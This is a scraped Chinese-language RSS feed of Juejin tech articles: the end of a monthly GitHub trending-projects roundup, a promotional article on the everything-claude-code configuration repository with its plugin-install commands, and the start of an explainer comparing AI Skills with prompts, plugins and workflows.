<p>💡 <strong><code>BitNet</code></strong> 适合想在普通硬件上运行百亿级 <code>LLM</code> 的开发者、研究者、企业，尤其在无 <code>GPU</code>、本地隐私、低功耗、边缘推理场景下，能彻底改变大模型部署方式，是 <code>1-bit LLM</code> 时代的核心基础设施。</p>
<p>👉 <strong>立即体验</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fmicrosoft%2FBitNet" target="_blank" title="https://github.com/microsoft/BitNet" ref="nofollow noopener noreferrer"><code>GitHub</code></a></p>
<h3 data-id="heading-10">结论</h3>
<p>2026 年 1 月的榜单，给我们非常清晰的信号：</p>
<ul>
<li><strong>本地化 + 隐私优先</strong> 已彻底成为主流，<code>OpenClaw</code>、<code>UI-TARS-desktop</code> 等项目让「<code>AI</code> 跑在你自己的设备上」变成日常现实</li>
</ul>

<ul>
<li><strong><code>Claude</code> 生态</strong> 正在以极快速度闭环，官方技能仓库 + 插件市场 + 智能调度工具相继到位，<code>Claude Code</code> 的生产力正在指数级释放</li>
<li><strong>多模态与高效推理</strong> 双双进入成熟阶段：代码生成视频、无向量高精度 <code>RAG</code>、<code>1-bit</code> 大模型推理，都在用最实际的方式降低门槛、提升效率</li>
</ul>
<p>这十个项目不再是酷炫的玩具，而是<strong>可以立刻装进工作流、立刻产生生产力</strong>的武器。2026 年刚开始，开源社区就用行动告诉我们：<strong>未来已来，而且它就跑在你的电脑和手机里</strong>。</p>
<p>📌 喜欢哪个就去点个 <code>Star</code>，每一个 <code>Star</code> 都是对开源社区最大的支持！</p>
<p>📬 欢迎收藏、转发，也欢迎在评论区安利你心目中的 <strong>2026 年 2 月黑马项目</strong>～</p>
<hr/>
<h3 data-id="heading-11">往期推荐</h3>
<p>喜欢本期的热门项目？以下是一些值得一读的往期精彩内容：</p>
<ol>
<li><a href="https://juejin.cn/post/7434159897197133836" target="_blank" title="https://juejin.cn/post/7434159897197133836">🚀 2024年11月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7434159897197133836" target="_blank" title="https://juejin.cn/post/7434159897197133836">🚀 2024年12月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7461822837532213267" target="_blank" title="https://juejin.cn/post/7461822837532213267">🚀 2025年01月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7475237484085346355" target="_blank" title="https://juejin.cn/post/7475237484085346355">🚀 2025年02月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7486316823253565474" target="_blank" title="https://juejin.cn/post/7486316823253565474">🚀 2025年03月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7503762078386700298" target="_blank" title="https://juejin.cn/post/7503762078386700298">🚀 2025年04月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7508914438659735589" target="_blank" title="https://juejin.cn/post/7508914438659735589">🚀 2025年05月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7525688196605722670" target="_blank" title="https://juejin.cn/post/7525688196605722670">🚀 2025年06月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7533169614206861339" target="_blank" title="https://juejin.cn/post/7533169614206861339">🚀 2025年07月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7543830033606246419" target="_blank" title="https://juejin.cn/post/7543830033606246419">🚀 2025年08月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7555056825693634601" target="_blank" title="https://juejin.cn/post/7555056825693634601">🚀 2025年09月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7567208390368198696" target="_blank" title="https://juejin.cn/post/7567208390368198696">🚀 2025年10月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7579889969986502707" target="_blank" title="https://juejin.cn/post/7579889969986502707">🚀 2025年11月 GitHub 十大热门项目排行榜 🔥</a></li>
<li><a href="https://juejin.cn/post/7591079707698315274" target="_blank" title="https://juejin.cn/post/7591079707698315274">🚀 2025年12月 GitHub 十大热门项目排行榜 🔥</a></li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[堪称外挂的 Claude Code 配置神器，在 GitHub 上杀疯了。]]></title>    <link>https://juejin.cn/post/7602158221851607055</link>    <guid>https://juejin.cn/post/7602158221851607055</guid>    <pubDate>2026-02-03T03:05:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602158221851607055" data-draft-id="7602158221851541519" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="堪称外挂的 Claude Code 配置神器，在 GitHub 上杀疯了。"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-02-03T03:05:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="逛逛GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            堪称外挂的 Claude Code 配置神器，在 GitHub 上杀疯了。
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    逛逛GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:05:23.000Z" title="Tue Feb 03 2026 03:05:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这个叫 everything-claude-code 的开源项目太顶了。开源没几天就 3.5 万的 Star 了。。。</p>
<p>先看它的简介，上面写的是：完整的 Claude Code 配置合集——Agent、Skill、Hook、快捷命令、规则、MCPs。来自 Anthropic 黑客马拉松获胜者的经过实战检验的配置。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be4e2c5b7c29434eb21f1c648dae2697~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692722&amp;x-signature=JOgJLu%2FjaigVycfoljj0Pa%2Bdfoo%3D" alt="图片" loading="lazy"/></p>
<p>重点是：来自 Anthropic 黑客马拉松获胜者的经过实战检验。</p>
<p>这个开源项目的作者是 Affaan Mustafa，是一位超级资深的 AI 开发者。</p>
<p>这个开源项目是它长达 10 个月的高强度使用 Claude Code 经验总结而来的。而且它用这套配置赢得了 Anthropic x Forum Ventures 黑客松 Hackathon 的冠军。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15eb428f6c814debb01ac116e6d5f148~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692722&amp;x-signature=bcZl8YYF1wr2Un%2FdWjcp3AwB570%3D" alt="图片" loading="lazy"/></p>
<p>在黑客松比赛中，时间很紧迫，通常只有一天。</p>
<p>他们在短短 8 小时 内，完全依靠 Claude Code 这一工具从零开发了一个 AI 驱动的客户发现平台：zenith.chat。</p>
<p>并成功进行了现场演示，最后获得了冠军儿🏆。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52d1d9f06eb64f2cafa1812a9a53bafa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692722&amp;x-signature=1X1Y5Bwp0TBWi6qkqSR5jNsA868%3D" alt="图片" loading="lazy"/></p>
<p>01</p>
<p><strong>开源项目简介</strong></p>
<p>everything-claude-code 是一个为 Claude Code 打造的完整配置工具箱，包括：可以直接用的 agents、skills、 hooks、快捷命令、 规则、MCP 配置。</p>
<p>它不是提示词合集，而是一个把 Claude Code 从 ChatBot 变成资深工程师的、实战检验过的完整开发工作流与配置套件。</p>
<p>说白了，就是能把你的 Claude Code 武装到牙齿。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b2042bbe3fd4ff8b36699e9aaee1f26~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692722&amp;x-signature=3RIxa3kyPXW67tebPuSLNJkp6BU%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">开源地址：github.com/affaan-m/everything-claude-code
</code></pre>
<p>看它这套开源项目架构，对于黑客松比赛酒友有针对性的战术。</p>
<p>① 合理使用 Agents：</p>
<p>他们没有把 Claude 仅仅当作一个 ChatBot，而是利用项目中的 Agents 配置，把 Claude 分裂成不同的角色：</p>
<p>Planner Agent：负责在写代码前由 AI 自动生成架构图和实施计划，避免了盲目编码导致的返工，在黑客松中这个很重要。</p>
<p>Code Reviewer Agent：在代码提交前自动审查，确保演示时不会因为低级错误，比如语法错误、未捕获的异常啥的，导致 Demo 失败。</p>
<p>②克服上下文腐烂：</p>
<p>在长达 8 小时的连续 Coding 中，普通 AI 往往会忘记之前的设定。</p>
<p>Affaan 利用这套配置中的 Skills 和 Rules，强制 AI 始终遵循特定的 TDD测试驱动开发模式，保持了代码逻辑的一致性，直到比赛结束。</p>
<p>③ MCP的使用：</p>
<p>他们通过配置 MCP 工具，比如 GitHub MCP, Supabase MCP等。</p>
<p>让 Claude 直接操作数据库和代码仓库。这意味着他们几乎不需要手动去数据库建表或在 IDE 之间来回切换，极大缩短了开发周期。</p>
<p>学习指南</p>
<p>当然只看这个开源项目学不到精髓，作者写了两篇文章，一定要去看看：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3e8bf66a036468791018c903612e529~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692722&amp;x-signature=2wSo6XjBa6o4hsvt1kraJ9e1rww%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-ruby" lang="ruby">指南一：<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/x.com/affaanmustafa</span><span class="hljs-regexp">/status/</span><span class="hljs-number">2012378465664745795</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c52453ef063149f2819a5f764a22d5d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692722&amp;x-signature=j4KPlEoIlqoTK7W7%2BC6lTG%2BJ4l4%3D" alt="图片" loading="lazy"/></p>
<pre><code class="hljs language-ruby" lang="ruby">指南二：<span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/x.com/affaanmustafa</span><span class="hljs-regexp">/status/</span><span class="hljs-number">2012378465664745795</span>
</code></pre>
<p>02</p>
<p><strong>如何使用</strong></p>
<p>在 Claude Code 中添加此仓库为插件市场：</p>
<pre><code class="hljs language-bash" lang="bash">/plugin marketplace add affaan-m/everything-claude-code
</code></pre>
<p>安装插件：</p>
<pre><code class="hljs language-css" lang="css">/plugin install everything-claude-<span class="hljs-selector-tag">code</span><span class="hljs-keyword">@everything-claude-code</span>
</code></pre>
<p>安装完成后，立即获得仓库中定义的所有 commands / agents / skills / hooks，开箱即用</p>
<p>在新项目启动阶段：可以先用 /plan 命令调用 planner/architect 等 agents，帮助梳理目标功能、选择技术栈并划分模块边界。</p>
<p>同时启用 coding-style.md、security.md、testing.md 等规则文件，把团队统一的编码规范、安全要求和测试标准固化下来，让后续所有对话和生成代码都在同一工程轨道上运行。</p>
<p>在具体开发过程中，采用 TDD + 验证循环的方式：通过 /tdd 命令让 Claude 按 RED → GREEN → REFACTOR → VERIFY 的流程推进开发。</p>
<p>用 /verify 执行实现验证、对比和边界分析，在关键里程碑使用 /checkpoint 记录思路快照和当前状态，既方便回滚，也方便日后回顾设计决策。</p>
<p>在质量与长期维护方面，日常多用 /code-review 命令，请专门的 review/safety agent 进行代码与安全审查，再配合 hooks 自动执行如清理 console.log、生成会话总结等后台任务。</p>
<p>对于中长期项目，则结合 continuous-learning/ 和 strategic-compact/ 相关 skills 与 hooks，让 Claude 持续积累项目记忆，并在上下文接近上限前做有策略的压缩，保证长期协作的连贯性与效率。</p>
<p>你可以把这个开源项目作为一个<strong>生产级起步模板，高效用 Claude Code 搭建严肃的软件工程工作流，在极短时间内产出可 demo 的产品。</strong> **<strong>不需要自己从 0 写 agents / skills / hooks。</strong>*# 堪称外挂的 Claude Code 配置神器，在 GitHub 上杀疯了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[祛魅！全网都在吹的Skills，究竟是个啥？]]></title>    <link>https://juejin.cn/post/7602161364892270592</link>    <guid>https://juejin.cn/post/7602161364892270592</guid>    <pubDate>2026-02-03T03:05:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602161364892270592" data-draft-id="7602146335215812648" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="祛魅！全网都在吹的Skills，究竟是个啥？"/> <meta itemprop="keywords" content="Coze"/> <meta itemprop="datePublished" content="2026-02-03T03:05:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吾鳴"/> <meta itemprop="url" content="https://juejin.cn/user/3683842894347076"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            祛魅！全网都在吹的Skills，究竟是个啥？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3683842894347076/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吾鳴
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T03:05:56.000Z" title="Tue Feb 03 2026 03:05:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是吾鳴。专注于分享提升工作与生活效率的工具，无偿分享AI领域相关的精选报告，持续关注AI的前沿动向。</p>
<p>最近Skills非常火爆，网上可以看到很多的文章在介绍它，后台也有挺多朋友问可否来一篇文章讲讲Coze Skills？我们先来了解一下Skills，然后再来看看Coze Skills。</p>
<p>Skills这个技术概念很新，大家可能比较陌生，但是如果我说Tools，如果有了解AI应用开发的，或许就会“哦......”。</p>
<p>Skills是由Anthropic公司在去年10月份推出来的技术概念，原本推出这个Skills是为了给Claude扩展能力用的(和Open AI 推出Tools的目的一样)，但是Skills推出来之后，使用者们都觉得异常的好用，所以就一发不可收拾，短短的几个月就火了起来。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4408c0725c64310a99496a0afc136a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770692756&amp;x-signature=WHP6dmXg5PTHiJ1RmmMTfT2%2F8Uw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">Skills是什么？</h2>
<p>通俗点来理解，我们可以把它理解成是一个可以复用的“AI技能包”，当AI需要去完成某项任务的时候，AI能够像翻阅操作手册一样，自动的去加载相关的Skills，然后选择合适的Skills来完成任务。</p>
<p>看着好像和Tools很像，但是它比Tools强的地方是，Skills并非一次性完全加载，而是可以层层按需加载Skills中的内容，AI先加载Skills的指令文件（约100个token，打比方），合适再加载其他资源（约3000个token，打比方），这样的好处就是可以让AI执行任务的时候消耗的token做到尽可能的少。</p>
<p>一个典型的Skills，它包含核心指令文件（SKILL.md）、脚本（Scripts）和资源（references）文件夹。</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-keyword">my</span>-skill/
├── SKILL.md          <span class="hljs-comment"># 必需的文件: 指令 + 元数据</span>
├── scripts/          <span class="hljs-comment"># 可选文件: 可执行的代码</span>
├── references/       <span class="hljs-comment"># 可选文件: 参考文档</span>
└── assets/           <span class="hljs-comment"># 可选文件: 模板，其他资源</span>
</code></pre>
<p>关于Skills规范的更详细的描述，感兴趣的朋友可以看看官方的定义，<a href="https://link.juejin.cn?target=https%3A%2F%2Fagentskills.io%2Fhome" target="_blank" title="https://agentskills.io/home" ref="nofollow noopener noreferrer">agentskills.io/home</a>。</p>
<h2 data-id="heading-1">Skills和其他概念什么区别？</h2>
<p><strong>1、Skills和提示词：</strong> 提示词更多的是偏向于对AI的行为的约束，比如限定AI的角色、任务、动作等，更多的像是对AI的口头指导，AI下次就遗忘了。</p>
<p>Skills则更加的系统化，是一个小闭环，里面包含了对这个技能的描述、说明等元数据，有提示词、脚本、资源等，结构会更清晰，当你对某个提示词在反复的复制黏贴的时候，就可以考虑把它封装成一个技能。</p>
<p><strong>2、Skills和插件：</strong> 插件是对外部的API调用或者是处理某个任务的实际操作；而Skills除了能包含插件所拥有的功能之外，它还有一份类似于操作指导手册的元数据，可以指导AI应该如何使用它。</p>
<p><strong>3、Skills和工作流：</strong> 工作流像是预设好的一条工厂流水线，里面的每一个步骤都是非常固定，输入了什么原材料，那么就会输出预想的产品；而Skills则是专业的工具、知识合集，它更多的像是某类技能的指导手册，指导AI根据手册自主决策怎么执行。</p>
